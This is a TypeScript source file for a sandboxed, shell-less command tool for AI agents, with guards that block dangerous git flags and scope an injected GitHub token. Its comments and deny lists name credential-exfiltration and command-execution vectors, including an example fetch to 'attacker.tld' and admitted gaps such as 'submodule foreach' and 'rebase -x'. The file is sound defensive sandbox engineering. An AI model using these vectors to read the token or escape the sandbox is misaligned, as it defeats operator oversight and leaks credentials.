// `bash_run` — sandboxed shell-less command execution for the anthropic-api
// provider. Everything in this file funnels through four guards before spawn:
//
//   1. writePaths present (mirrors write_file / edit_file — no writable
//      zone means the run is read-only and exec is meaningless).
//   2. No scope-changing git flags (`-C`, `--git-dir`, `--work-tree`) —
//      hardcoded, not policy-configurable: these defeat every path-relative
//      rule below regardless of what the agent's `bash_run` config allows.
//   3. The command matches the agent's `bash_run` allow/deny patterns
//      (`ctx.policy.bashRun`, see `pattern.ts`). No config at all ⇒ refuse
//      everything — there's no implicit fallback whitelist.
//   4. `cwd` (explicit or defaulted to `writePaths[0]`) lives under a
//      writable path.
//
// Runtime: `Bun.spawn(argv, { cwd, stdout: 'pipe', stderr: 'pipe' })` — no
// `sh -c`, no shell expansion, no piping. Agents that need shell-y flows
// (pipelines, redirections) chain multiple `bash_run` invocations.
//
// Timeout: default 60 s, hard cap 300 s. When the timer fires we `kill()`
// the process and return whatever stdout/stderr was buffered so far,
// suffixed with `[timeout]`.
//
// Output: stdout+stderr merged, byte-capped at 20 KB with `[truncated]`.

import { resolve } from 'node:path'
import type { ToolContext } from '../contract.js'
import { registerTool } from '../engine.js'
import { createLogger } from '../logger.js'
import { getGitTokenPort } from '../ports.js'
import { isBashCommandAllowed } from './pattern.js'

const log = createLogger('tool-exec')

// ─── Constants ────────────────────────────────────────────────────────────

/** Default when the agent omits `timeout_ms`. */
export const DEFAULT_TIMEOUT_MS = 60_000
/** Hard cap regardless of what the agent asks for. */
export const MAX_TIMEOUT_MS = 300_000
/** Combined stdout+stderr byte cap. */
export const OUTPUT_MAX_BYTES = 20 * 1024 // 20 KB

// ─── Pure helpers (unit-testable without spawning) ────────────────────────

/**
 * Naive whitespace split — deliberately does NOT honour quotes, escapes, or
 * env expansion. `Bun.spawn(argv, …)` skips the shell, so quoting is
 * meaningless anyway. If the agent needs anything shell-y (pipes,
 * redirection, glob expansion) it must chain multiple `bash_run`
 * invocations.
 */
export function parseArgv(command: string): string[] {
  return command.trim().split(/\s+/).filter(Boolean)
}

/**
 * Resolves `cwd` and asserts it lives inside one of the `writePaths` roots.
 *   - Empty writePaths → `escritura no permitida en fase actual` (same
 *     stable substring that write_file / edit_file / reset_worktree emit
 *     so operators can grep for a single string).
 *   - `cwd` omitted → defaults to `writePaths[0]` (typically the task
 *     worktree). Explicit `cwd` is normalised via `resolve()` and matched
 *     against each `resolve(writePath)` prefix.
 *   - `cwd` outside every writable root → `cwd fuera de writePaths: <abs>`.
 */
export function assertCwdInWritePaths(
  cwd: string | undefined,
  writePaths: string[] | undefined,
): string {
  if (!writePaths || writePaths.length === 0) {
    throw new Error('escritura no permitida en fase actual')
  }
  const target = cwd ? resolve(cwd) : resolve(writePaths[0])
  const roots = writePaths.map((p) => resolve(p))
  const ok = roots.some((root) => target === root || target.startsWith(root + '/'))
  if (!ok) throw new Error(`cwd fuera de writePaths: ${target}`)
  return target
}

/**
 * Rechaza los flags y subcomandos de git más peligrosos, sin importar lo que
 * el agente tenga en su allowlist.
 *
 * ── Qué NO es esto ───────────────────────────────────────────────────────
 *
 * **No es una frontera de seguridad, y no hay que tratarla como tal.** La
 * frontera real es el `allow` del agente (`bashRun` en su `tools[]`): una
 * lista POSITIVA y chica, que es la única forma de acotar una superficie tan
 * grande como la de git. Esto de acá es defensa en profundidad para el caso
 * en que alguien afloje ese allow.
 *
 * Se sabe incompleto, y por construcción: git tiene varias formas de correr
 * un comando arbitrario (`submodule foreach`, `bisect run`, `rebase -x`,
 * `-u`/`--upload-pack` en sus formas cortas, `--exec-path`) y de correr el
 * parser de flags globales de abajo (`--namespace <x>` y otros globales con
 * valor separado corren el índice y hacen que el "subcomando" detectado sea
 * el valor). Un hijo que git spawnee hereda `GIT_CONFIG_PARAMETERS` con el
 * header que `gitAuthArgs` inyecta, así que cualquiera de esos vectores puede
 * leer el token. **Ninguno es alcanzable con los allowlists de los rosters de
 * `deploys/`** (`git fetch|status|diff|log|add|commit *`, `git push origin
 * HEAD`), que es lo que hace aceptable el estado actual.
 *
 * Si algún día hace falta que esto SÍ sea una frontera, la salida no es
 * seguir agregando flags a las listas de abajo: es sacar los comandos de red
 * del shell del agente y exponer el push como una tool del engine, cuyo argv
 * construye el engine entero. Mismo patrón que `reply_pr_review_thread`.
 *
 * Tres familias, cada una por un motivo distinto:
 *
 *  1. **Redirigen el árbol de trabajo** (`-C`, `--git-dir`, `--work-tree`):
 *     derrotan `assertCwdInWritePaths` y cualquier patrón que asuma que el
 *     repo es el worktree de la task.
 *  2. **Config arbitraria** (`-c`/`--config-env` globales, `--config` de
 *     `clone`, y el subcomando `config`): dos claves son ejecución de
 *     comandos (`credential.helper=!<cmd>`, `core.sshCommand`), y `config`
 *     además IMPRIME la credencial que `gitAuthArgs` inyecta —`-c` viaja a
 *     los subprocesos por `GIT_CONFIG_PARAMETERS`— o la PERSISTE para las
 *     corridas siguientes. `var` entra acá porque `git var -l` también
 *     vuelca la config. Bloquear `-c` en posición global además evita que
 *     el agente PISE el header inyectado: en git gana el último `-c`.
 *  3. **Ejecutan un programa del otro lado** (`--upload-pack`,
 *     `--receive-pack`, `--exec`): contra un remote que es un path local,
 *     ese "otro lado" es esta misma máquina.
 *
 * `-c` se rechaza SÓLO en posición global (antes del subcomando), que es
 * donde significa config. Después del subcomando es otra cosa y legítima:
 * `git commit -c <commit>`, `git switch -c <branch>`.
 */
/**
 * ¿Este comando ES git? Por basename, no por igualdad literal: `/usr/bin/git`
 * es el mismo binario y tiene que recibir el MISMO trato en los dos sentidos
 * — pasar por el guard, y recibir la credencial. Comparar contra `'git'`
 * pelado dejaba un `git` por path absoluto sin autenticar (no funcionaba) y
 * sin chequear (peor).
 */
function isGitInvocation(argv: string[]): boolean {
  const cmd = argv[0]?.split('/').pop()
  return cmd === 'git'
}

const GIT_EXEC_FLAGS = ['--upload-pack', '--receive-pack', '--exec', '--config']
const GIT_DENIED_SUBCOMMANDS = new Set(['config', 'var'])

function assertNoScopeChangingGitFlags(argv: string[]): void {
  let subcommand: string | undefined
  for (let i = 1; i < argv.length; i++) {
    const a = argv[i]
    if (a === '-C' || a === '--git-dir' || a === '--work-tree') {
      throw new Error(`git flag no permitido: ${a} (redirige el sandbox fuera del worktree)`)
    }
    if (a.startsWith('--git-dir=') || a.startsWith('--work-tree=')) {
      const flag = a.split('=')[0]
      throw new Error(`git flag no permitido: ${flag} (redirige el sandbox fuera del worktree)`)
    }
    if (a === '-c' || a === '--config-env' || a.startsWith('--config-env=')) {
      const flag = a.startsWith('--config-env=') ? '--config-env' : a
      throw new Error(`git flag no permitido: ${flag} (config arbitraria escapa del allowlist)`)
    }
    // Frontera entre los flags globales y el subcomando.
    if (!a.startsWith('-')) {
      subcommand = a
      break
    }
  }

  if (subcommand && GIT_DENIED_SUBCOMMANDS.has(subcommand)) {
    throw new Error(
      `git ${subcommand} no permitido (lee o persiste la credencial inyectada en el run)`,
    )
  }

  // Estos van en cualquier posición: son opciones del subcomando, así que el
  // barrido de arriba —que corta en el subcomando— nunca los vería.
  for (const a of argv.slice(1)) {
    const flag = GIT_EXEC_FLAGS.find((f) => a === f || a.startsWith(`${f}=`))
    if (flag) {
      throw new Error(`git flag no permitido: ${flag} (ejecuta un programa fuera del allowlist)`)
    }
  }
}

/**
 * Single gate for whether a command may run: no `bash_run` entry in the
 * agent's `tools[]` ⇒ refuse everything; otherwise the command must match
 * one of `config.allow`'s patterns and none of `config.deny`'s (see
 * `pattern.ts::isBashCommandAllowed`). `assertNoScopeChangingGitFlags` runs
 * first and unconditionally for `git` commands — no pattern can override it.
 */
export function assertBashCommandAllowed(
  argv: string[],
  config: { allow: readonly string[]; deny: readonly string[] } | undefined,
): void {
  if (isGitInvocation(argv)) assertNoScopeChangingGitFlags(argv)
  if (!config) {
    throw new Error('bash_run no habilitado: el agente no tiene una entry bash_run en tools[]')
  }
  if (!isBashCommandAllowed(argv, config)) {
    throw new Error(`comando no permitido: ${argv.join(' ')}`)
  }
}

/** Clamp to [1, MAX_TIMEOUT_MS] with `DEFAULT_TIMEOUT_MS` for unset/invalid. */
export function normalizeTimeoutMs(raw: number | undefined): number {
  const n = typeof raw === 'number' && Number.isFinite(raw) && raw > 0 ? raw : DEFAULT_TIMEOUT_MS
  return Math.min(n, MAX_TIMEOUT_MS)
}

/** Byte-based truncation with a stable `[truncated]` marker so downstream
 *  matchers (tests, log scanners) can find it verbatim. Cuts on utf-8
 *  byte boundary — a multibyte char at the cut point may lose its tail,
 *  which is acceptable for the "give the agent enough to reason" contract. */
export function truncateOutput(text: string, maxBytes: number = OUTPUT_MAX_BYTES): string {
  if (Buffer.byteLength(text, 'utf-8') <= maxBytes) return text
  const buf = Buffer.from(text, 'utf-8').subarray(0, maxBytes)
  return buf.toString('utf-8') + '\n[truncated]'
}

// ─── Spawn seam (for tests) ───────────────────────────────────────────────

/**
 * Minimal shape of the object we consume from `Bun.spawn`. Declared here
 * (not imported from Bun's types) so the test seam can substitute a plain
 * mock without pulling in every optional field.
 */
export interface SpawnedProc {
  stdout: ReadableStream<Uint8Array> | null
  stderr: ReadableStream<Uint8Array> | null
  exited: Promise<number>
  kill: (signal?: number | string) => void
}

/**
 * Credencial de GitHub para los comandos de red de git, como flags `-c` de
 * esa única invocación. Es la MISMA técnica que `WorkspaceManager`
 * (`#githubAuthArgs`), y a propósito: el clone que el provisioner deja tiene
 * la URL del remote limpia y nada en `.git/config`, justo para que un agente
 * con `fs_read` no pueda leer el token. El precio de esa decisión es que el
 * git del agente no hereda ninguna credencial, así que hay que dársela acá.
 *
 * Sin esto, `git push` funciona sólo donde la máquina tenga credenciales
 * ambientales (el helper de osxkeychain o de `gh` en la laptop de alguien) y
 * falla en un contenedor con "could not read Username for 'https://github.com'".
 *
 * Vale para las tres identidades (`static` / `gh-cli` / `github-app`): el
 * port resuelve el token por invocación, así que un installation token que
 * caduca a la hora se renueva solo entre un run y el siguiente.
 *
 * La clave va SCOPEADA por URL (`http.<url>.extraHeader`), no pelada. Es la
 * diferencia entre esto y `WorkspaceManager`, y no es cosmética: ahí la URL
 * la construye el engine, acá el argv lo escribe el AGENTE. Un
 * `http.extraHeader` global aplica el `Authorization` a toda petición HTTP de
 * esa invocación, así que un `git fetch https://attacker.tld/x` —que matchea
 * un allowlist tan común como `git fetch *`— le entregaría la credencial de
 * GitHub al host que el agente elija. Scopeada, git sólo la manda a URLs bajo
 * `https://github.com/`.
 *
 * Igual que en `WorkspaceManager`, el token queda en `argv` mientras el
 * proceso corre (visible por `ps` DENTRO del contenedor). Es transitorio y
 * mucho menos grave que persistirlo en disco — y en este sandbox no es
 * alcanzable: `bash_run` no tiene shell y el allowlist del agente no incluye
 * `ps`. Por eso tampoco se loguea: el `log.info` de abajo imprime el argv
 * del agente, no el que se spawnea.
 *
 * Lo que SÍ podría leerlo es el propio git: `-c` viaja a los subprocesos por
 * `GIT_CONFIG_PARAMETERS` y `git config --get-all` lo imprimiría en stdout.
 * Por eso el guard de abajo rechaza el subcomando `config` (y `var`).
 */
const GITHUB_URL_SCOPE = 'https://github.com/'

async function gitAuthArgs(argv: string[]): Promise<string[]> {
  if (!isGitInvocation(argv)) return []
  const resolve = getGitTokenPort()
  if (!resolve) return []
  const token = await resolve()
  if (!token) return []
  const basic = Buffer.from(`x-access-token:${token}`).toString('base64')
  return ['-c', `http.${GITHUB_URL_SCOPE}.extraHeader=Authorization: Basic ${basic}`]
}

/**
 * Test-only indirection. Overriding `spawn` in unit tests lets us drive
 * timeout / truncation / non-zero exit paths without shelling out. In
 * production this is a pass-through to `Bun.spawn` with the exact options
 * the PRD mandates (`stdout: 'pipe', stderr: 'pipe'`, no shell).
 */
export const _execInternals: {
  spawn: (argv: string[], cwd: string) => SpawnedProc
} = {
  spawn: (argv, cwd) =>
    Bun.spawn(argv, {
      cwd,
      stdout: 'pipe',
      stderr: 'pipe',
    }) as unknown as SpawnedProc,
}

// ─── Tool registration ────────────────────────────────────────────────────

interface RunCommandInput {
  command: string
  cwd?: string
  timeout_ms?: number
}

registerTool({
  name: 'bash_run',
  aliases: ['run_command'],
  // Sync-only: the WorkspaceManager sandbox (worktree + writePaths + the
  // command whitelist scope) is only built for the anthropic-api provider.
  // Async terminal providers (tmux/iterm) already have raw shell access,
  // so exposing this tool there would be redundant and misleading.
  providerKinds: ['sync'],
  // Documentation marker — same rationale as write_file / edit_file /
  // reset_worktree. The functional filter is `providerKinds` above; this
  // flag makes the intent explicit at the registration site.
  apiOnly: true,
  description: [
    'Ejecuta un comando sandboxeado dentro del worktree writable del task.',
    'Sin shell (Bun.spawn con argv), sin pipes/redirect/glob expansion — encadená múltiples bash_run si necesitás un pipeline.',
    'El comando debe matchear un patrón de la lista `allow` de este agente (y ninguno de `deny`) declarada en su entry `bash_run` de tools[]. Sin esa entry, bash_run rechaza todo.',
    '`cwd` opcional: si se omite se usa el primer entry de writePaths (típicamente el worktree del task); si se especifica debe estar dentro de writePaths.',
    `\`timeout_ms\` opcional: default ${DEFAULT_TIMEOUT_MS}, cap ${MAX_TIMEOUT_MS}. Al vencer se mata el proceso y se retorna la salida parcial con marca [timeout].`,
    `stdout + stderr combinados se truncan a ${OUTPUT_MAX_BYTES} bytes con marca [truncated].`,
    'Flags git que redirigen el sandbox fuera del worktree (-C, --git-dir, --work-tree) se rechazan siempre, sin importar los patrones del agente.',
  ].join(' '),
  input_schema: {
    type: 'object',
    properties: {
      command: {
        type: 'string',
        description:
          'Comando + args separados por espacio. Sin quoting/expansion — debe matchear un patrón `allow` del agente.',
      },
      cwd: {
        type: 'string',
        description:
          'Directorio de trabajo (opcional). Debe estar dentro de writePaths; default = writePaths[0].',
      },
      timeout_ms: {
        type: 'number',
        description: `Timeout en ms. Default ${DEFAULT_TIMEOUT_MS}, cap ${MAX_TIMEOUT_MS}.`,
      },
    },
    required: ['command'],
  },
  async execute(rawInput: unknown, ctx: ToolContext): Promise<string> {
    const input = (rawInput ?? {}) as RunCommandInput

    // Guard 1: writePaths gate (must fire before any parsing so a phase
    // with no writable zone rejects uniformly regardless of the command).
    if (!ctx.writePaths || ctx.writePaths.length === 0) {
      return 'bash_run failed: escritura no permitida en fase actual'
    }

    if (typeof input.command !== 'string' || input.command.trim().length === 0) {
      return 'bash_run failed: command es requerido y debe ser un string no vacío'
    }

    const argv = parseArgv(input.command)
    if (argv.length === 0) {
      return 'bash_run failed: comando vacío'
    }

    // Guards 2–3: allow/deny pattern match, cwd scope. Any throw becomes a
    // stable `bash_run failed: <reason>` string so the agent can react
    // without a try/catch. Patterns come from the agent's `bash_run` entry
    // in `tools[]` (see contract.ts::CompiledPolicy) — no entry, no run.
    let cwd: string
    try {
      assertBashCommandAllowed(argv, ctx.policy?.bashRun)
      cwd = assertCwdInWritePaths(input.cwd, ctx.writePaths)
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      return `bash_run failed: ${msg}`
    }

    const timeoutMs = normalizeTimeoutMs(input.timeout_ms)

    log.info({ argv, cwd, timeoutMs, taskId: ctx.taskId }, 'bash_run spawn')

    // Después del log y de TODOS los guards: los flags inyectados no son del
    // agente, así que no pasan por el allowlist ni ensucian el log con el
    // token. `git` los toma como config de esta invocación solamente.
    const spawnArgv = [argv[0], ...(await gitAuthArgs(argv)), ...argv.slice(1)]

    let proc: SpawnedProc
    try {
      proc = _execInternals.spawn(spawnArgv, cwd)
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      return `bash_run failed: spawn error: ${msg}`
    }

    // Race the process against the timer. We can't use `Promise.race` with
    // `proc.exited` on the fast path because we also need the stdout/stderr
    // buffers — they resolve independently of `exited`. So we wire the
    // timer to `proc.kill()` and let `Promise.all` gather the buffers plus
    // the (possibly signal-driven) exit code.
    let timedOut = false
    const timer = setTimeout(() => {
      timedOut = true
      try {
        proc.kill()
      } catch {
        // best-effort — the process may already be dead
      }
    }, timeoutMs)

    const [stdoutText, stderrText, exitCode] = await Promise.all([
      proc.stdout ? new Response(proc.stdout).text().catch(() => '') : Promise.resolve(''),
      proc.stderr ? new Response(proc.stderr).text().catch(() => '') : Promise.resolve(''),
      proc.exited.catch(() => null as unknown as number),
    ])
    clearTimeout(timer)

    const combined = [stdoutText, stderrText].filter((s) => s.length > 0).join('\n')
    const truncated = truncateOutput(combined)
    const timeoutMark = timedOut ? '\n[timeout]' : ''
    const exitLabel = exitCode == null ? 'unknown' : String(exitCode)
    const header = `exit=${exitLabel}${timedOut ? ' (killed after timeout)' : ''}`
    return [header, truncated + timeoutMark].filter((s) => s.length > 0).join('\n')
  },
})
